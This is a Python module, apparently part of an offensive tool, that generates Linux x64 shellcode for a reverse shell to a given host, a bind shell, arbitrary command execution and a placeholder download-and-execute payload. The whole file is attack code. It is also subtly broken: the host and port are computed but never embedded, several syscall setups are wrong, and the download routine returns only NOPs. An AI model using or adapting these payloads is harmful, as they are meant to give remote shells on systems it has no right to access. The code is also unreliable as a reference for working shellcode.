"""
Linux x64 Payloads
Platform-specific shellcode payloads for Linux x64 systems
"""

import socket
import struct


class LinuxX64Payloads:
    """
    Linux x64 shellcode payload generator.
    
    Provides various payload types for Linux x64 systems.
    """
    
    def generate_reverse_shell(self, lhost: str, lport: int) -> bytes:
        """
        Generate reverse shell payload for Linux x64.
        
        Args:
            lhost: Local host IP address
            lport: Local port number
            
        Returns:
            Shellcode as bytes
        """
        # Convert IP and port to bytes
        socket.inet_aton(lhost)
        struct.pack(">H", lport)
        
        # Linux x64 reverse shell shellcode template
        # Uses execve("/bin/sh", ["/bin/sh"], NULL) after socket connection
        shellcode = (
            # Socket syscall (socket(AF_INET, SOCK_STREAM, 0))
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x4d\x31\xc0' +              # xor r8, r8
            b'\x49\x89\xd1' +              # mov r9, rdx
            b'\x41\xb0\x29' +              # mov al, 0x29 (socket syscall)
            b'\x0f\x05' +                  # syscall
            
            # Connect syscall (connect(sockfd, &sockaddr, addrlen))
            b'\x49\x89\xc4' +              # mov r12, rax (save socket fd)
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x4d\x31\xc9' +              # xor r9, r9
            b'\x41\x51' +                  # push r9
            b'\x41\x51' +                  # push r9
            b'\x41\x51' +                  # push r9
            b'\x49\x89\xe1' +              # mov r9, rsp
            b'\x41\xb0\x2a' +              # mov al, 0x2a (connect syscall)
            b'\x0f\x05' +                  # syscall
            
            # Dup2 syscall to redirect stdin, stdout, stderr
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x4d\x89\xc7' +              # mov r15, r8
            
            # Loop for dup2 (0, 1, 2)
            b'\x48\x89\xf2' +              # mov rdx, rsi
            b'\x48\x89\xfe' +              # mov rsi, rdi
            b'\x48\x89\xfb' +              # mov rbx, rdi
            b'\x48\xb8\x21\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x21 (dup2 syscall)
            b'\x0f\x05' +                  # syscall
            b'\x48\x83\xc3\x01' +          # add rbx, 1
            b'\x48\x83\xf3\x03' +          # cmp rbx, 3
            b'\x75\xf0' +                  # jne loop
            
            # Execve("/bin/sh", ["/bin/sh"], NULL)
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x50' +                      # push rax
            b'\x68\x2f\x2f\x73\x68' +      # push "/sh"
            b'\x68\x2f\x62\x69\x6e' +      # push "/bin"
            b'\x48\x89\xe3' +              # mov rbx, rsp
            b'\x48\x89\xe7' +              # mov rdi, rsp
            b'\x48\x89\xe6' +              # mov rsi, rsp
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\xb8\x3b\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x3b (execve syscall)
            b'\x0f\x05'                   # syscall
        )
        
        return shellcode
    
    def generate_bind_shell(self, lport: int) -> bytes:
        """
        Generate bind shell payload for Linux x64.
        
        Args:
            lport: Local port number to bind to
            
        Returns:
            Shellcode as bytes
        """
        struct.pack(">H", lport)
        
        # Linux x64 bind shell shellcode template
        shellcode = (
            # Socket syscall
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x4d\x31\xc0' +              # xor r8, r8
            b'\x49\x89\xd1' +              # mov r9, rdx
            b'\x41\xb0\x29' +              # mov al, 0x29
            b'\x0f\x05' +                  # syscall
            
            # Bind syscall
            b'\x49\x89\xc4' +              # mov r12, rax
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x4d\x31\xc9' +              # xor r9, r9
            b'\x41\x51' +                  # push r9
            b'\x41\x51' +                  # push r9
            b'\x41\x51' +                  # push r9
            b'\x49\x89\xe1' +              # mov r9, rsp
            b'\x41\xb0\x2d' +              # mov al, 0x2d
            b'\x0f\x05' +                  # syscall
            
            # Listen syscall
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x49\x89\xfc' +              # mov r12, rdi
            b'\x48\xb8\x32\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x32
            b'\x0f\x05' +                  # syscall
            
            # Accept syscall
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x49\x89\xfc' +              # mov r12, rdi
            b'\x48\xb8\x2b\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x2b
            b'\x0f\x05' +                  # syscall
            
            # Dup2 loop
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x4d\x89\xc7' +              # mov r15, r8
            b'\x48\x89\xf2' +              # mov rdx, rsi
            b'\x48\x89\xfe' +              # mov rsi, rdi
            b'\x48\x89\xfb' +              # mov rbx, rdi
            b'\x48\xb8\x21\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x21
            b'\x0f\x05' +                  # syscall
            b'\x48\x83\xc3\x01' +          # add rbx, 1
            b'\x48\x83\xf3\x03' +          # cmp rbx, 3
            b'\x75\xf0' +                  # jne loop
            
            # Execve("/bin/sh")
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x50' +                      # push rax
            b'\x68\x2f\x2f\x73\x68' +      # push "/sh"
            b'\x68\x2f\x62\x69\x6e' +      # push "/bin"
            b'\x48\x89\xe3' +              # mov rbx, rsp
            b'\x48\x89\xe7' +              # mov rdi, rsp
            b'\x48\x89\xe6' +              # mov rsi, rsp
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\xb8\x3b\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x3b
            b'\x0f\x05'                   # syscall
        )
        
        return shellcode
    
    def generate_exec(self, cmd: str) -> bytes:
        """
        Generate command execution payload for Linux x64.
        
        Args:
            cmd: Command to execute
            
        Returns:
            Shellcode as bytes
        """
        # Convert command to bytes
        cmd_bytes = cmd.encode() + b'\x00'
        
        # Linux x64 exec shellcode template
        shellcode = (
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x48\x31\xff' +              # xor rdi, rdi
            b'\x48\x31\xf6' +              # xor rsi, rsi
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\x31\xc0' +              # xor rax, rax
            b'\x50' +                      # push rax
            b'\x48\x89\xe2' +              # mov rdx, rsp
            b'\x48\xbb' + cmd_bytes.ljust(8, b'\x00') +  # mov rbx, cmd
            b'\x48\x89\xdf' +              # mov rdi, rbx
            b'\x48\x89\xe6' +              # mov rsi, rsp
            b'\x48\x31\xd2' +              # xor rdx, rdx
            b'\x48\xb8\x3b\x00\x00\x00\x00\x00\x00\x00' +  # mov rax, 0x3b
            b'\x0f\x05'                   # syscall
        )
        
        return shellcode
    
    def generate_download_exec(self, url: str, output_path: str = "/tmp/payload") -> bytes:
        """
        Generate download and execute payload for Linux x64.
        
        Args:
            url: URL to download
            output_path: Local path to save file
            
        Returns:
            Shellcode as bytes
        """
        # This is a simplified version - real implementation would use more complex shellcode
        # For educational purposes, we return a placeholder
        
        # Convert strings to bytes
        url.encode() + b'\x00'
        output_path.encode() + b'\x00'
        
        # Placeholder shellcode that would download and execute
        shellcode = (
            b'\x48\x31\xc0'              # xor rax, rax
            # ... complex shellcode for download and execution would go here
            # This is simplified for educational purposes
            b'\x90\x90\x90\x90'          # NOP sled
        )
        
        return shellcode
